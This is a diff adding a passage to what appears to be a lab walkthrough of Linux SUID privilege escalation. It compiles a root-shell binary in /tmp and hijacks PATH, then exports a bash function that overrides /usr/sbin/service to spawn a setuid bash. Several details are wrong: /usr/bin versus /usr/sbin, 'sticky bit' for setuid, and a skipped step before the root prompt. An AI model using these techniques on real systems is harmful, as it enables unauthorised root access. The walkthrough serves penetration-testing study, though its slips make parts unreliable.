@@ -134,3 +134,90 @@ We can remove the existing log file and create a symlink to the location that po
 
 ## Environmental Variables
 
+Another way we can exploit SUID files is by manipulating the `PATH` variable. From our initial search, we found out there is file named `/usr/local/bin/suid-env` that has SUID set.
+
+### Relative Path
+
+If we perform a `strings` look up on it, we get the following output.
+
+```bash
+TCM@debian:~$ strings /usr/local/bin/suid-env
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start
+```
+
+It seems like the `service` command is called within the binary. If we can override which file is run when the `service` command is invoked, we can exploit this binary. 
+
+Since the absolute path is not given, we can manipulate the `$PATH` env variable to point `service` to one of our own files as follow.
+
+```bash
+TCM@debian:~$ echo 'int main() {setgid(0); setuid(0); system("/bin/bash");}' > /tmp/service.c
+TCM@debian:~$ cat /tmp/service.c 
+int main() {setgid(0); setuid(0); system("/bin/bash");}
+TCM@debian:~$ gcc -o /tmp/service /tmp/service.c
+TCM@debian:~$ export PATH=/tmp:$PATH
+TCM@debian:~$ $PATH
+bash: /tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin: No such file or directory
+```
+
+Now, the first place `service` is searched for is the `/tmp` directory and we have written a simple script named `service` to open up `bash`. Now we simply need to execute the `/usr/local/bin/suid-env` binary.
+
+```bash
+TCM@debian:~$ id
+uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
+TCM@debian:~$ /usr/local/bin/suid-env
+root@debian:~# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
+```
+
+### Absolute Path
+
+Let's look at another binary that uses env variables.
+
+```bash
+TCM@debian:~$ strings /usr/local/bin/suid-env2
+/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+/usr/sbin/service apache2 start
+
+TCM@debian:~$ ls -ld /usr/sbin/
+drwxr-xr-x 2 root root 4096 May 14  2017 /usr/sbin/
+```
+
+Unlike the previous binary, this calls the function by its absolute path. Since only `root` has write privileges to `/usr/bin`, we cannot edit the `service` binary as well.
+
+However, there is another way to manipulate the env variables by defining a function. We will overwrite `/usr/bin/service` with a custom function that will create a copy of `bash` with the sticky bit set and execute it.
+
+```bash
+TCM@debian:~$ function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+TCM@debian:~$ export -f /usr/sbin/service
+root@debian:~# whoami
+root
+```
+
+Since we are creating a subshell when the binary is executed, we need to export the function using the `export -f` command.
+
